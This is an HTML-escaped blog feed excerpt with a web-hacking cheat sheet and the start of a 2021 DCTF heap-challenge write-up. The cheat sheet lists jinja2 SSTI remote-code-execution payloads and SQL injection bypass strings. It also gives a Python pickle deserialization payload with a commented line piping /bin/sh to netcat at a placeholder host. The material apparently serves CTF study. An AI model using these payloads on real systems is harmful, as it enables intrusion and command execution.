&lt;span class=&quot;k&quot;&gt;Select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tbl&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'1234'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'5678'&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;-- between and (both number and char are possible)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;Select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tbl&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;age&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;between&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;-- 20&amp;lt;=age&amp;lt;=30&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;Select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tbl&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;score&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;between&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'A'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'C'&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;-- 'A'&amp;lt;=score&amp;lt;='C'&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;--like (starts with ~, ends with ~, include ~, length)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;Select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tbl&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;like&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Bae%'&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;-- starts with Bae&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;Select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tbl&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;like&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%uk'&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;-- ends with uk&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;Select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tbl&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;like&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%won%'&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;-- include won&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;Select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tbl&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;like&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'___'&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;-- length 3 chars&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;Select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tbl&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;binary&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;like&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'~'&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;-- distinguish upper/lower&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;4. Internal function in mysql&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;char(...)&lt;/code&gt; : change integer arguments to char (ex. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;char(0x61,0x62,0x63)&lt;/code&gt;=&amp;gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;abc&quot;&lt;/code&gt;)&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mid/substr[ing](a,b,c)&lt;/code&gt; : get &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c&lt;/code&gt; bytes in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a&lt;/code&gt; from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;b(starts from 1 ~ ..)&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;left(a,b)&lt;/code&gt; / &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;right(a,b)&lt;/code&gt; : get &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;b&lt;/code&gt; bytes in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a&lt;/code&gt; (begin / end(reverse but print correctly))&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;version()&lt;/code&gt; : get mysql version&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;database()&lt;/code&gt; : get current database&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;python-pickle-deserialization&quot;&gt;python pickle deserialization&lt;/h2&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pickle&lt;/code&gt;ë¡œ ì§ë ¬í™”ëœ ê°ì²´ê°€ ë³€ì¡°ë˜ì–´ ì—­ì§ë ¬í™”í•˜ëŠ” ê³¼ì •ì—ì„œ ì‹œìŠ¤í…œì— ì ‘ê·¼í•˜ê±°ë‚˜ ì˜ë„ì¹˜ ì•Šì€ ê²ƒì´ ì‹¤í–‰ë˜ê¸°ë„ í•œë‹¤. ì›í•˜ëŠ” classë¥¼ ì„ ì–¸í•œ ë’¤, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__reduce__&lt;/code&gt;ë¥¼ í†µí•˜ì—¬ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pickle.loads&lt;/code&gt; í•¨ìˆ˜ì—ì„œ unpickle ì‹œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tuple&lt;/code&gt;ì„ ë°˜í™˜í•˜ì—¬ í•¨ìˆ˜ë¥¼ ì‹¤í–‰ì‹œí‚¬ ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pickle&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__reduce__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;#return (os.system, ('ls', ))
&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;#return (os.system, ('cat flag', ))
&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/bin/sh'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;#return (os.system, ('/bin/sh | nc [ip] [port]', ))
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;pickle_d&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pickle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dumps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;pickle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pickle_d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# get shell anyway
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;update ì˜ˆì •.&lt;/p&gt;</content><author><name>Ainsetin</name></author><category term="note" /><summary type="html">post will be frequently updated SSTI (Server Side Template Injection) í•´ë‹¹ ì·¨ì•½ì ì€ ì›¹ í”„ë ˆì„ì›Œí¬ì—ì„œ ì‚¬ìš©ë˜ëŠ” ì—¬ëŸ¬ ê°€ì§€ Template Engineì—ì„œ ë°œìƒí•˜ë©°, íŠ¹ë³„í•œ êµ¬ë¬¸ì„ í†µí•´ RCEë¥¼ ì¼ìœ¼í‚¬ ìˆ˜ë„ ìˆë‹¤. This vulnerability occurs in various Template Engines used in web frameworks, RCE and can also be triggered through special syntax. â–¶ jinja2 # ê¸°ë³¸ {{ 4*4 }} =&amp;gt; 16 # check with config {{ config }} {{ config.items() }} {{ config['secret_key'] }} # RCE with config {{ config.__class__.__init__.__globals__['os'].popen(&quot;ls&quot;).read() }} {{ (config|attr(&quot;__class__&quot;)).__init__.__globals__['os'].popen('cat flag').read() }} # etc ('',(),get_flashed_messages, url_for, ...) {{ ''.__class__.__mro__[1].__subclasses__()[**index**]('cat flag', shell=True, stdout=-1).communicate() }} {{ get_flashed_messages.__globals__.__builtins__.open(&quot;/flag&quot;).read() }} {{ url_for.__globals__.__builtins__.eval('__import__(&quot;os&quot;).popen(&quot;ls -al&quot;).read()') }} # with request - í•„í„°ë§ì´ ë§¤ìš° ë§ì„ ê²½ìš° more query + requestë¥¼ í™œìš©í•˜ì—¬ ìš°íšŒ http://foo.bar/?payload={{ request|attr('class')|attr(request.args.get('mro'))|attr(request.args.get('getitem'))(1) }}&amp;amp;class=__class__&amp;amp;mro=__mro__&amp;amp;getitem=__getitem__ {{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')()}} SQLI (sql injection) í•´ë‹¹ ì·¨ì•½ì ì€ DBë¥¼ ê´€ë¦¬í•˜ëŠ” ì‘ìš© í”„ë¡œê·¸ë¨ì—ì„œ SQL ì¿¼ë¦¬ë¥¼ ì „ë‹¬í•  ë•Œ ì˜ë„í•˜ì§€ ì•Šì€ êµ¬ë¬¸ì„ ì „ë‹¬í•  ìˆ˜ ìˆë„ë¡ ë³€ì¡°ì‹œí‚¤ëŠ” ë° ëª©ì ì´ ìˆë‹¤. The vulnerability is aimed at modulating the DB management application to deliver unintended phrases when delivering SQL queries. 1. Comment symbol /* ~ */, -- ~, # (URL encoded : %23) -- example. Select * from tbl where id='(user_input)' -- Select ALL query from tbl user_input=&quot;' or 1=1-- &quot; =&amp;gt; Select * from tbl where id='' or 1=1--' user_input=&quot;' or 1=1#&quot; =&amp;gt; Select * from tbl where id='' or 1=1# user_input=&quot;' or 1=1/*1234*/&quot; =&amp;gt; Select * from tbl where id='' or 1=1/*1234*/' ...? (must have closed symbol) 2. with single quarter idê°€ ''ë¡œ ê°ì‹¸ì ¸ ìˆì„ ê²½ìš° 'ë¥¼ inputìœ¼ë¡œ ë„£ì–´ ë¨¼ì € ë‹«ì•„ì£¼ê²Œë” í•œ ë’¤ ì¡°ê±´ë¬¸ì„ ì´ì–´ì¤€ë‹¤. -- example. Select * from tbl where id='(user_input)' -- Select ALL query from tbl user_input=&quot;' or 1='1&quot; =&amp;gt; Select * from tbl where id='' or 1='1' 3. and, or, &amp;amp;&amp;amp;, ||, in, between, like -- and, or Select * from tbl where id='1234' and pw='5678' Select * from tbl where id='1234' or pw='5678' -- &amp;amp;&amp;amp;, || (no space required) Select * from tbl where id='1234'&amp;amp;&amp;amp;pw='5678' Select * from tbl where id='1234'||pw='5678' -- in Select * from tbl where id in '1234' and pw in '5678' -- between and (both number and char are possible) Select * from tbl where age between 20 and 30 -- 20&amp;lt;=age&amp;lt;=30 Select * from tbl where score between 'A' and 'C' -- 'A'&amp;lt;=score&amp;lt;='C' --like (starts with ~, ends with ~, include ~, length) Select * from tbl where name like 'Bae%' -- starts with Bae Select * from tbl where name like '%uk' -- ends with uk Select * from tbl where name like '%won%' -- include won Select * from tbl where name like '___' -- length 3 chars Select * from tbl where binary name like '~' -- distinguish upper/lower 4. Internal function in mysql char(...) : change integer arguments to char (ex. char(0x61,0x62,0x63)=&amp;gt;&quot;abc&quot;) mid/substr[ing](a,b,c) : get c bytes in a from b(starts from 1 ~ ..) left(a,b) / right(a,b) : get b bytes in a (begin / end(reverse but print correctly)) version() : get mysql version database() : get current database python pickle deserialization pickleë¡œ ì§ë ¬í™”ëœ ê°ì²´ê°€ ë³€ì¡°ë˜ì–´ ì—­ì§ë ¬í™”í•˜ëŠ” ê³¼ì •ì—ì„œ ì‹œìŠ¤í…œì— ì ‘ê·¼í•˜ê±°ë‚˜ ì˜ë„ì¹˜ ì•Šì€ ê²ƒì´ ì‹¤í–‰ë˜ê¸°ë„ í•œë‹¤. ì›í•˜ëŠ” classë¥¼ ì„ ì–¸í•œ ë’¤, __reduce__ë¥¼ í†µí•˜ì—¬ pickle.loads í•¨ìˆ˜ì—ì„œ unpickle ì‹œ tupleì„ ë°˜í™˜í•˜ì—¬ í•¨ìˆ˜ë¥¼ ì‹¤í–‰ì‹œí‚¬ ìˆ˜ ìˆë‹¤. import os import pickle class payload(object): def __reduce__(self): #return (os.system, ('ls', )) #return (os.system, ('cat flag', )) return (os.system, ('/bin/sh', )) #return (os.system, ('/bin/sh | nc [ip] [port]', )) pickle_d=pickle.dumps(payload()) pickle.loads(pickle_d) # get shell anyway $ id uid=1000(test) gid=1000(test) groups=1000(test) update ì˜ˆì •.</summary></entry><entry><title type="html">2021 dctf write-up</title><link href="https://ainset.in//dctf-2021-just-another-heap.html" rel="alternate" type="text/html" title="2021 dctf write-up" /><published>2021-05-17T19:18:39+09:00</published><updated>2021-05-17T19:18:39+09:00</updated><id>https://ainset.in//dctf_2021_just_another_heap</id><content type="html" xml:base="https://ainset.in//dctf-2021-just-another-heap.html">&lt;h2 id=&quot;tasks&quot;&gt;Tasks&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;PwnğŸ’»
    &lt;ul&gt;
      &lt;li&gt;Just Another Heap (500pts)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;just-another-heap-500pts&quot;&gt;Just Another Heap (500pts)&lt;/h2&gt;

&lt;p&gt;I couldnâ€™t solve this one prob in time, but I want to post this solving skills. Itâ€™s hard to find, but when I found it, Itâ€™s very simple Arbitrary Write.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2021-dctf/1.png&quot; alt=&quot;1.png&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;It has 5 user functions(create, relive, forget, change, listing).&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;create()&lt;/code&gt; has a role that makes malloc_frame(0x20) and  malloc_userinput(size).
The point is, this prob has a unique fading input with this part.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;How long is your memory&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;input_lu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                          &lt;span class=&quot;c1&quot;&gt;// no size check&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;malloc_user&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;               &lt;span class=&quot;c1&quot;&gt;// size &amp;gt; 0x308 / forget -&amp;gt; unsorted bin&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Sometimes our memories fade and we only remember parts of them.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;input_lu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fade&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                          &lt;span class=&quot;c1&quot;&gt;// no filter&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Would you like to leave some space at the beginning in case you remember later?&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fade&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;malloc_user&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fade&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;malloc_user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'_'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;malloc_user&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fade&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;memories will be faded &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fade&lt;/code&gt; bytes with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_&lt;/code&gt;, and user input is behind the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_&lt;/code&gt; strings if malloc_user is NOT 0.
So, if &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;malloc(size)&lt;/code&gt; returns &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt;, I can overwrite anywhere.&lt;/p&gt;

&lt;h3 id=&quot;exploit&quot;&gt;Exploit&lt;/h3&gt;

&lt;p&gt;First, set chunks that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;size&amp;gt;0x408&lt;/code&gt; between 2 small chunks
to leak libc from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_arena+xx&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;And make 1 tcache and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x410&lt;/code&gt; unsorted bin. Now &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_arena+xx&lt;/code&gt; has written in unsorted bin.&lt;/p&gt;

&lt;p&gt;and if I rewrite and use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;change()&lt;/code&gt; to fill fade bytes and get libc addr with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;relive()&lt;/code&gt; function.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;change()&lt;/code&gt; function : overwrite from the beginning or behind fade &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_&lt;/code&gt; strings&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;relive()&lt;/code&gt; function : print user input with fade &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_&lt;/code&gt; string&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Finally, Use This mentioned skills to do GOT Overwriting.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;memories will be faded &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fade&lt;/code&gt; bytes with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_&lt;/code&gt;, and user input is behind the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_&lt;/code&gt; strings
if malloc_user is NOT 0.
So, if &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;malloc(size)&lt;/code&gt; returns &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt;, I can overwrite anywhere.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;input &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh\x00&lt;/code&gt; in malloc_frame[] and program will call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strcspn(addr,'\n')&lt;/code&gt;. Get The Shell.&lt;/p&gt;

&lt;h3 id=&quot;code&quot;&gt;Code&lt;/h3&gt;

&lt;p&gt;Here is the Exploit Code.&lt;/p&gt;

&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;log_level&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'debug'&lt;/span&gt;

